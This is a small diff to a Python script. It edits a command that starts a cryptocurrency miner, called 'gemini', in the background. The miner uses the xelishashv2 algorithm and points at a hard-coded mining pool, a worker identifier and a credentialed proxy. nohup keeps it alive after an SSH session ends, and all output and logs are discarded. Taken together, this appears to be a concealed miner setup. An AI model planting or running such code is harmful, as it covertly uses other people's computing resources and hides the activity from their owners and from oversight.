@@ -69,7 +69,7 @@ def run_gemini_in_background():
     # The nohup command ensures the process continues running even if the script or SSH session terminates.
     # All output is redirected to /dev/null to keep the terminal clean.
     run_command = (
-        "nohup ./Gem/gemini -a xelishashv2 -o 51.195.26.234:7019 -w krxXJMWJKW.pipis "
+        "nohup ./Gem/gemini -a xelishashv2 -o 51.195.26.234:7019 -w krxXJMWJKW.pipiss "
         "--proxy username:username@193.106.199.233:12324 --log-file /dev/null > /dev/null 2>&1 &"
     )
 
